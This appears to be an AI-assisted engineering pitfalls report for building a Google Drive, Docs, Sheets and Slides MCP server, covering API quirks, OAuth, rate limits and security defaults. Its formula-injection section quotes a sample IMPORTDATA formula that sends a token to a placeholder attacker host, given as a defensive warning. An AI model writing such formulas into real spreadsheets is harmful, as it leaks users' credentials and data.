# Pitfalls Research

**Domain:** Google Drive / Docs / Sheets / Slides MCP Server
**Researched:** 2026-03-20
**Confidence:** HIGH (drawn from reference implementation code, companion Gmail server patterns, and direct API knowledge from training data)

---

## Critical Pitfalls

### Pitfall 1: Google Workspace Files Cannot Be Downloaded with `files.get(alt=media)` — Must Use `files.export`

**What goes wrong:**
Calling `drive.files.get({ fileId, alt: 'media' })` on a Google Doc, Sheet, Slide, or Drawing returns a 403 or empty response. The file has no binary content to download; it only exists as a Google Workspace format.

**Why it happens:**
Google Workspace files (`application/vnd.google-apps.*`) have no raw bytes — they are rendered server-side. Developers assume all Drive files work the same way.

**How to avoid:**
Check `mimeType.startsWith('application/vnd.google-apps')` before choosing the download path. Use `drive.files.export({ fileId, mimeType: exportMimeType })` for Workspace files, and `drive.files.get({ fileId, alt: 'media' })` for everything else. The reference implementation in `download-file.ts` handles this correctly via `isWorkspaceFile` flag and the `GOOGLE_WORKSPACE_EXPORT_FORMATS` map.

**Warning signs:**
- 403 `cannotDownloadAbusiveFile` or empty stream when downloading a Doc/Sheet/Slide
- Unit tests that mock `files.get` but don't test Workspace-type branching

**Phase to address:**
Drive tools phase (file download implementation). Must be in first iteration, not a follow-up.

---

### Pitfall 2: Docs API `batchUpdate` Indices Shift After Each Insert — Wrong Order Corrupts Documents

**What goes wrong:**
When multiple `insertText` or `deleteContentRange` requests are batched together, each request's `startIndex` / `endIndex` refers to the document state *after* all preceding requests in the same batch have been applied. If you compute all indices from the original document and then batch them in forward order, the second and subsequent insertions land at wrong positions.

**Why it happens:**
The Google Docs API applies requests sequentially within a batch. An insert at index 10 shifts all subsequent indices up by the number of inserted characters. Developers read indices from the document once, compute all positions, then send a batch — which is correct only if requests are ordered from highest index to lowest (so earlier operations don't affect later ones).

**How to avoid:**
When batching multiple insertions or deletions: order requests from **highest index to lowest** (reverse order), so no prior operation invalidates a subsequent index. For a delete-then-insert (full document update), split into two separate `batchUpdate` calls: first delete everything, then insert fresh content. The reference `updateGoogleDoc` handler does exactly this — a separate delete call followed by a separate insert call.

**Warning signs:**
- Text inserted at unexpected positions after multi-step batch operations
- Content corruption when updating a non-empty document with new content

**Phase to address:**
Docs tools phase. Must be validated with a round-trip test: insert → read back → verify position.

---

### Pitfall 3: Docs API Index 0 Is Reserved — All Content Starts at Index 1

**What goes wrong:**
Attempting to insert text at `index: 0` throws a 400 error from the API. A newly created empty Google Doc has a single structural newline character at index 1; the body ends at index 2.

**Why it happens:**
The Docs API uses 1-based character indexing for body content, but the document structure adds an implicit segment start at index 0 that is write-protected.

**How to avoid:**
Always insert at `index >= 1`. For fresh documents, insert at `index: 1`. Enforce this with Zod: `.min(1, "Index must be at least 1 (1-based)")` on every index input. The reference `InsertTextSchema` and `InsertTableSchema` already do this.

**Warning signs:**
- API error `Invalid requests[0].insertText: Index must be positive` when inserting into a new document

**Phase to address:**
Docs tools phase. Validate in schema definitions; write a test that creates a doc and inserts at index 1.

---

### Pitfall 4: OAuth Refresh Token Not Stored — Token Lost on Process Restart

**What goes wrong:**
After the initial OAuth dance produces an access token and refresh token, if the refresh token is never persisted, every process restart requires re-authentication. The access token expires after 1 hour. Without a valid refresh token in environment or file storage, all API calls fail with 401.

**Why it happens:**
`google-auth-library`'s `OAuth2Client` holds tokens in memory. On process restart the token is gone. Developers testing interactively may not notice because their local session stays alive.

**How to avoid:**
Follow the companion gmail/calendar pattern exactly: load `GOOGLE_DRIVE_CLIENT_ID`, `GOOGLE_DRIVE_CLIENT_SECRET`, and `GOOGLE_DRIVE_REFRESH_TOKEN` from env vars at startup. Set credentials on the client immediately: `authClient.setCredentials({ refresh_token: process.env.GOOGLE_DRIVE_REFRESH_TOKEN })`. The `async-mutex` pattern ensures concurrent tool calls don't race on token refresh.

**Warning signs:**
- 401 errors appearing only after the process has been running for > 1 hour
- Works fine in dev sessions but fails in long-running MCP server instances

**Phase to address:**
Auth phase (Phase 1). Non-negotiable — must be in place before any tool can be tested end-to-end.

---

### Pitfall 5: Shared Drive Files Require `supportsAllDrives: true` on Every API Call

**What goes wrong:**
Any `drive.files.*` call that omits `supportsAllDrives: true` will return a 404 for files that live in a Shared Drive (Team Drive), even though the service account or user has permission. The API silently excludes Shared Drive content unless the flag is set.

**Why it happens:**
Shared Drives (formerly "Team Drives") require explicit opt-in per call. The flag was added later for backward compatibility; the default is `false`.

**How to avoid:**
Add `supportsAllDrives: true` and `includeItemsFromAllDrives: true` to every `files.list`, `files.get`, `files.create`, `files.update`, `files.copy`, and `files.delete` call. The reference implementation does this consistently throughout `drive.ts`. Never omit it.

**Warning signs:**
- 404 on files that are visible in the Drive UI
- Files in personal My Drive work; the same file ID in a Shared Drive returns 404

**Phase to address:**
Drive tools phase. Standardize `supportsAllDrives: true` as a mandatory field in a `driveCallDefaults` object and reference it everywhere.

---

### Pitfall 6: `drive.files.list` Defaults Exclude Shared Drives — Results Are Incomplete

**What goes wrong:**
`drive.files.list` without `corpora: 'allDrives'` and `includeItemsFromAllDrives: true` only searches the authenticated user's My Drive. Files in Shared Drives are silently omitted from search results, causing the MCP agent to report "no files found" even when matching files exist.

**Why it happens:**
Default corpus is `'user'`. The `allDrives` corpus requires the two additional flags above.

**How to avoid:**
All search and list calls must include `corpora: 'allDrives'`, `includeItemsFromAllDrives: true`, and `supportsAllDrives: true`. The reference `search` handler already does this.

**Warning signs:**
- Searches return no results for files the user can see in Drive UI
- Files created by other users in shared folders are not found

**Phase to address:**
Drive tools phase — search implementation must include all three flags from the start.

---

### Pitfall 7: Drive Query Single Quotes Must Be Escaped — Unescaped Quotes Cause 400 Errors

**What goes wrong:**
A Drive search query like `name = 'O'Brien'` or `fullText contains 'doesn't'` returns a 400 `Invalid Value` error because unescaped single quotes break the query syntax.

**Why it happens:**
The Drive API query language uses single-quoted strings. Any single quote or backslash in user input must be escaped before interpolation.

**How to avoid:**
Use the `escapeDriveQuery` utility before inserting any user-provided string into a query: `value.replace(/\\/g, "\\\\").replace(/'/g, "\\'")`. This is already implemented in `utils.ts`. Apply it to every dynamic query component, not just the "obvious" search fields.

**Warning signs:**
- 400 errors from `files.list` when user input contains apostrophes or backslashes
- Test suite that only exercises ASCII alphanumeric queries

**Phase to address:**
Drive tools phase. Write a test case specifically with apostrophes in filenames and search terms.

---

### Pitfall 8: Sheets `valueInputOption: 'USER_ENTERED'` Executes Formulas — Formula Injection Risk

**What goes wrong:**
When `valueInputOption` is `'USER_ENTERED'`, any cell value beginning with `=` is interpreted as a formula. A malicious or naive agent writing `=IMPORTDATA("https://evil.example.com/exfil?token=...")` to a cell will execute that formula in the spreadsheet, potentially exfiltrating data or making external network requests.

**Why it happens:**
`USER_ENTERED` mode mimics typing into the spreadsheet UI. It is required for legitimate formula use but creates an injection vector when writing untrusted content.

**How to avoid:**
Default all write operations to `valueInputOption: 'RAW'`. Only use `USER_ENTERED` when the tool description explicitly states it and when the caller controls all input. Document the security warning in tool descriptions — the reference `createGoogleSheet` description already includes a `SECURITY WARNING` block. In the new implementation, copy this pattern exactly.

**Warning signs:**
- Tool descriptions do not mention formula injection risk
- Default `valueInputOption` is `USER_ENTERED`

**Phase to address:**
Sheets tools phase. The default must be `RAW` in both the schema and the tool description.

---

### Pitfall 9: Moving Files Between My Drive and Shared Drive Is Blocked

**What goes wrong:**
`drive.files.update` with `addParents` / `removeParents` throws a 403 `cannotMoveSharedDriveItem` when attempting to move a file from a Shared Drive to My Drive or vice versa. Cross-drive moves are not supported via the files API.

**Why it happens:**
Shared Drives have separate permission domains from My Drive. Moving across this boundary would require cross-domain permission re-evaluation that the API does not support in a single operation.

**How to avoid:**
When implementing `moveItem`, detect if source and destination are in different drive types. The only workaround is copy-then-delete, which must be surfaced to the caller as a distinct operation. Document the limitation in the `moveItem` tool description.

**Warning signs:**
- 403 errors specifically on `moveItem` calls when the destination is a Shared Drive
- Tests only cover My Drive → My Drive moves

**Phase to address:**
Drive tools phase. Add validation that checks whether source and target are in the same drive; return a descriptive error if not, suggesting `copyFile` then `deleteItem` instead.

---

### Pitfall 10: Docs API Image Insertion Requires a Publicly Accessible URL

**What goes wrong:**
`insertInlineImage` in the Docs API fetches the image from the provided URL at the time of the API call. If the URL is behind authentication, on localhost, or requires cookies, the Google server-side fetch fails with a cryptic error. Drive `webContentLink` URLs are also not publicly accessible unless the file has `anyone` reader permission.

**Why it happens:**
The Docs API server fetches images server-side from Google infrastructure, not through the user's auth context.

**How to avoid:**
When inserting a local image, upload it to Drive first, grant `reader` permission to `anyone` (or ensure the hosting URL is public), then use the resulting `webContentLink`. The reference `insertLocalImageHelper` in `docs.ts` does this via the `makePublic` flag pattern. Expose `makePublic` as a tool parameter and default it to `false` with clear documentation about when `true` is needed.

**Warning signs:**
- 400 `Invalid requests[0].insertInlineImage: The provided image URI is invalid` errors
- Image insertion works in testing with public URLs but fails in production with Drive-hosted images

**Phase to address:**
Docs tools phase — image insertion. The two-step upload-then-insert pattern must be implemented together, not as a shortcut of just passing the Drive URL.

---

### Pitfall 11: Sheets A1 Notation With Sheet Names Containing Special Characters Must Be Single-Quoted

**What goes wrong:**
A sheet named `My Data` or `Q1 2025 (Draft)` causes the Sheets API to return a 400 when used unquoted in a range like `My Data!A1:C10`. The API requires such names be wrapped in single quotes: `'My Data'!A1:C10`.

**Why it happens:**
Sheet names with spaces, parentheses, or other non-alphanumeric characters are ambiguous in A1 notation without quoting. The API enforces this strictly.

**How to avoid:**
The `parseA1Range` utility in `utils.ts` already strips single quotes when parsing. When constructing A1 ranges to send to the API, always re-add single quotes around sheet names that contain non-alphanumeric characters: `'${sheetName}'!${cellRange}`. Implement a `quoteSheetName(name)` helper that conditionally wraps the name.

**Warning signs:**
- 400 errors on Sheets operations with multi-word sheet names
- Test suite only tests `Sheet1` (no spaces, no special chars)

**Phase to address:**
Sheets tools phase. Write a test with a sheet named `"My Sheet"` (with a space) for every read/write operation.

---

### Pitfall 12: Drive API Rate Limits — 20,000 Queries/100 Seconds Per User, Burst Limit Lower

**What goes wrong:**
When searching or listing files with path resolution (each folder lookup triggers an additional `files.get` call), a single `search` operation can fan out to dozens of API calls. Under load or when processing large result sets, the server hits the per-user quota and starts receiving 429 `rateLimitExceeded` responses.

**Why it happens:**
The reference `search` handler resolves parent folder paths for every file in the result set, issuing one `files.get` per unique parent. For a 100-result page with files spread across many folders, this is up to 100 additional API calls per search request.

**How to avoid:**
Implement a per-request in-memory path cache (as the reference implementation does with `pathCache`). For the MCP server context, add exponential backoff with jitter for 429 responses. Use the `Retry-After` header when present. For Sheets batch operations, prefer `spreadsheets.values.batchGet` over multiple `values.get` calls.

**Warning signs:**
- 429 errors appearing during searches over large Drive collections
- Latency spikes when resolving folder paths for search results

**Phase to address:**
Drive tools phase — search. The path cache must be in the initial implementation, not added as an optimization later.

---

### Pitfall 13: Slides API Object IDs Must Be Globally Unique UUIDs Supplied by the Caller

**What goes wrong:**
When creating new page elements via `batchUpdate` (text boxes, shapes, images), the caller must supply a unique `objectId`. If two requests accidentally use the same ID, the second one fails. If the ID format is not a UUID-like string, the API may reject it.

**Why it happens:**
Unlike Docs and Sheets, the Slides API does not auto-generate element IDs for new objects created via `batchUpdate`. The caller owns ID generation.

**How to avoid:**
Always generate IDs with `uuidv4()` (which the reference `slides.ts` imports). Never reuse IDs within a presentation. Never hardcode test IDs. Pass generated IDs in `createShape`, `createTextBox`, etc.

**Warning signs:**
- 400 `Invalid requests[N].createShape: Object ID already exists` on repeated calls
- Tests that use hardcoded strings like `"textbox-1"` as object IDs

**Phase to address:**
Slides tools phase. The UUID import must be present from day one of Slides implementation.

---

### Pitfall 14: Docs API `updateGoogleDoc` (Full Replacement) Fails on Empty Documents

**What goes wrong:**
When attempting to replace all content in a document, the implementation must first delete from index 1 to `endIndex - 1`. On a brand-new empty document, the body content has only the implicit paragraph character, so `endIndex` is 2 and `deleteEndIndex` is 1. Attempting to delete the range `[1, 1)` (zero-length) throws a 400 error.

**Why it happens:**
The Docs API body always has at least one structural paragraph character that cannot be deleted. A document with no user content has `endIndex = 2`, meaning the only deletable content range is length-0, which is invalid.

**How to avoid:**
Guard the delete operation with `if (deleteEndIndex > 1)` before calling `batchUpdate` — only issue the delete if there is actually content to remove. The reference `updateGoogleDoc` handler already implements this guard correctly.

**Warning signs:**
- 400 errors when calling `updateGoogleDoc` on a freshly created empty document
- Test suite only covers updating documents that already have content

**Phase to address:**
Docs tools phase. Write a test: create doc → immediately update with new content → verify no error and content is correct.

---

### Pitfall 15: `drive.files.delete` Permanently Deletes — Use `trashed: true` Instead

**What goes wrong:**
`drive.files.delete(fileId)` permanently and irrecoverably deletes the file. There is no undo. In an AI agent context, a misidentified file ID leads to data loss with no recovery path.

**Why it happens:**
The API exposes hard delete as a single call. Developers default to `delete` because it mirrors familiar CRUD patterns.

**How to avoid:**
Use `drive.files.update({ fileId, requestBody: { trashed: true } })` to move the file to Google Drive trash. Users can restore from trash within 30 days. Only expose a hard-delete path if explicitly needed and behind a `confirm: true` gate. The reference `deleteItem` handler correctly uses the soft-delete pattern.

**Warning signs:**
- Any implementation of `deleteItem` that calls `drive.files.delete()` directly
- No mention of "trash" in the delete tool description

**Phase to address:**
Drive tools phase. The soft-delete pattern is non-negotiable. Document in tool descriptions that deletion moves to trash.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Skipping `supportsAllDrives` on a subset of calls | Faster initial implementation | Silent 404s for Shared Drive users; hard to debug | Never |
| Using `USER_ENTERED` as default for Sheets writes | Formulas work out of the box | Formula injection risk; unpredictable data coercion | Only for explicit formula-writing tools |
| Not implementing exponential backoff for 429s | Simpler error handling code | Cascading failures under load; poor UX | Only acceptable for MVP single-user personal use |
| Hardcoding `Sheet1` as the default sheet name | Simpler A1 range parsing | Fails silently when user renames the first sheet | Never — always require explicit sheet name or look it up |
| Skipping `trashed = false` in search queries | Slightly simpler query | Deleted files appear in results, confusing the agent | Never |
| Single-call batchUpdate for multi-position Docs edits | Fewer API calls | Corrupted document structure from index drift | Never for forward-order multi-position inserts |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Drive API v3 | Using `files.get` for Workspace file downloads | Use `files.export` with target MIME type |
| Docs API | Mixing 0-based and 1-based indices across operations | Docs API is 1-based throughout; Slides is 0-based for text ranges — treat as separate systems |
| Sheets API | Using `A1` notation without qualifying the sheet name | Prefix every range with `SheetName!` unless targeting Sheet1 specifically |
| OAuth `drive` scope vs `drive.file` scope | `drive.file` only grants access to files created by the app | Use full `drive` scope for searching/accessing pre-existing files |
| Slides API | Calling formatting operations with element IDs obtained from `getGoogleSlidesContent` | Object IDs from `getGoogleSlidesContent` are stable; use them for formatting, not the generated UUIDs |
| Drive API move | Using `addParents` alone without `removeParents` | A file can have multiple parents in Drive v3 — always remove the old parent when moving |
| Docs API comments | Expecting programmatic comments to visually anchor in the document | API comments appear in the comment panel but may not render as highlighted text anchors in the UI |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Resolving folder paths for every file in search results | Search for 100 files triggers 100 additional `files.get` calls | In-memory path cache per request, keyed by folder ID | At > 20 unique parent folders per search result page |
| Fetching full document content to find a text range | `documents.get` response is 50KB+ for large docs | Use targeted `fields` mask; avoid fetching full document to answer simple questions | Documents > 100 paragraphs |
| Sequential Sheets reads instead of batch | N tool calls to read N ranges | Use `spreadsheets.values.batchGet` for multiple ranges | Reading > 3 ranges from the same spreadsheet |
| Re-creating `google.drive()` client on every tool call | Overhead from client construction | Cache the client instance, only recreate on auth client change | High-frequency tool calls (> 10/second) |
| Loading entire DOCX export to parse comments | JSZip parsing is synchronous and expensive | Only parse DOCX if Drive API comment context is missing; fall back to simpler approach for v1 | Documents > 5MB |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| `valueInputOption: 'USER_ENTERED'` by default on Sheets writes | Formula injection — `=IMPORTDATA()` or `=IMPORTRANGE()` can exfiltrate data or call external URLs | Default to `RAW`; warn in tool description; only use `USER_ENTERED` when caller explicitly requests formula evaluation |
| Making uploaded images publicly accessible without disclosure | Files marked `anyone with link can view` are indexed by Google and can be discovered | Default `makePublic: false`; document the implication; require explicit `makePublic: true` |
| Logging full file content in debug output | Sensitive document content appears in server logs | Log operation metadata (file ID, name, size) only; never log file content |
| Storing OAuth refresh token in logs or error messages | Refresh tokens are long-lived credentials equivalent to a password | Validate env vars at startup without echoing values; never include token values in error messages |
| Granting `owner` role via `addPermission` without confirmation | Transfers ownership of a file to another user, which is irreversible by the original owner | Document that `owner` role transfer is permanent; consider blocking it in v1 tools |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Returning raw file IDs without URLs | Agent output is opaque — user cannot click to verify the file | Always include `webViewLink` in create/update responses |
| `deleteItem` with no indication it is reversible | User thinks data is permanently lost | Explicitly state "moved to trash — can be restored from Google Drive trash within 30 days" |
| Sheets write tool that silently truncates data beyond the specified range | Agent thinks data was written; spreadsheet is missing rows | Validate that data array dimensions match the specified range, or return the actual written range in the response |
| Docs insert tool that doesn't report the new content length | Agent cannot determine the updated end index for follow-up operations | Return the document's new length or the inserted text's index range in the response |
| Search results with no "no more results" indicator | Agent stops paginating too early | Always include `nextPageToken` presence/absence in the response, and the total count if available |

---

## "Looks Done But Isn't" Checklist

- [ ] **Drive file download:** Tested with a Google Doc (Workspace type) — not just a plain text file. Export format selection works.
- [ ] **Docs insert text:** Tested on a fresh empty document (index 1 insertion). Tested on a document with existing content (index shifting verified).
- [ ] **Docs update (full replace):** Tested on an empty document (no delete needed) AND a non-empty document (delete then insert).
- [ ] **Sheets write:** Tested with `RAW` mode (default). Formula injection test: value starting with `=` is stored as text, not executed.
- [ ] **Drive search:** Tested with a filename containing an apostrophe (e.g., "O'Brien's Report"). No 400 error.
- [ ] **Drive moveItem:** Tested with `removeParents` set to the old parent — not just `addParents` alone.
- [ ] **Shared Drive access:** At least one test exercises a file in a Shared Drive — not just My Drive.
- [ ] **Slides text box creation:** Uses `uuidv4()` for objectId, not a hardcoded string.
- [ ] **OAuth token refresh:** Verified that a tool call succeeds after the access token has expired (requires a 1-hour wait or token manipulation in tests).
- [ ] **Sheets A1 with spaces in sheet name:** Range `'My Sheet'!A1:B2` works correctly (single-quoted sheet name).
- [ ] **Image insertion in Docs:** Tested with a non-public image — verifies the `makePublic` parameter is necessary and documented.
- [ ] **deleteItem response:** Response text mentions "trash" and restorability.

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Document content corrupted by wrong-order batchUpdate | HIGH | Restore from Drive revision history (`files.revisions.list` + `files.revisions.get`). If revision saving was not triggered, manual re-entry required. |
| File permanently deleted via `files.delete` | HIGH (if not caught quickly) | Google Drive trash is bypassed — contact Google Workspace admin for recovery within the 25-day admin window. After that: unrecoverable. |
| OAuth refresh token invalidated (user revoked access) | MEDIUM | User must re-authorize. With env-var auth pattern, this means generating a new refresh token and updating the env var. |
| Rate limit (429) hit in production | LOW | Add exponential backoff + jitter. Identify which operation is issuing excessive calls (likely path resolution in search). Reduce per-search `pageSize` to lower fan-out. |
| Sheets formula injection via `USER_ENTERED` | MEDIUM | Identify affected cells, delete formula content, audit for external network calls in the spreadsheet. Switch tool to `RAW` default immediately. |
| Image uploaded with `makePublic: true` exposing sensitive content | MEDIUM | Revoke `anyone` permission via `permissions.delete`. Audit Drive activity log to determine if the link was accessed externally. |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Workspace files require `files.export` | Drive tools phase | Integration test: download a Google Doc as PDF and as plain text |
| Docs batchUpdate index ordering | Docs tools phase | Round-trip test: insert multiple paragraphs, read back, verify positions |
| Docs index starts at 1 | Docs tools phase | Schema validation test + test inserting into fresh empty doc |
| OAuth refresh token persistence | Auth phase (Phase 1) | Test: simulate expired access token, verify auto-refresh works |
| `supportsAllDrives` required | Drive tools phase | Test with a file in a Shared Drive (or mock Shared Drive 404 behavior) |
| `allDrives` corpus for search | Drive tools phase | Test: search returns Shared Drive files when present |
| Drive query escaping | Drive tools phase | Test: search for filename with apostrophe |
| Sheets formula injection via USER_ENTERED | Sheets tools phase | Test: write `=1+1` with RAW, verify stored as text not computed |
| Cross-drive move blocked | Drive tools phase | Test: document the limitation, verify descriptive error |
| Docs image insertion needs public URL | Docs tools phase | Test: insert local image with `makePublic: false` and `true` |
| Sheet name quoting in A1 | Sheets tools phase | Test: read/write range on sheet named `"My Sheet"` |
| API rate limits | Drive tools phase | Load test or mock: verify 429 triggers retry, not error propagation |
| Slides UUID object IDs | Slides tools phase | Test: create two shapes in sequence, verify both succeed |
| Empty doc update guard | Docs tools phase | Test: create doc, immediately update with new content |
| Soft delete with trash | Drive tools phase | Test: delete file, verify `trashed: true` not hard-deleted, restore succeeds |

---

## Sources

- Reference implementation: `/tmp/google-drive-mcp/src/tools/drive.ts`, `docs.ts`, `sheets.ts`, `slides.ts`
- Reference download implementation: `/tmp/google-drive-mcp/src/download-file.ts`
- Reference utilities: `/tmp/google-drive-mcp/src/utils.ts` (A1 parsing, query escaping)
- Reference auth: `/tmp/google-drive-mcp/src/auth/scopes.ts`, `client.ts`
- Companion error handling patterns: `/home/franciscpd/Projects/mcp-server-gmail/src/utils/errors.ts`
- Google Drive API v3 documentation (training knowledge, HIGH confidence for established patterns)
- Google Docs API v1 documentation (training knowledge, HIGH confidence for batchUpdate semantics)
- Google Sheets API v4 documentation (training knowledge, HIGH confidence for valueInputOption)

---
*Pitfalls research for: Google Drive / Docs / Sheets / Slides MCP Server*
*Researched: 2026-03-20*
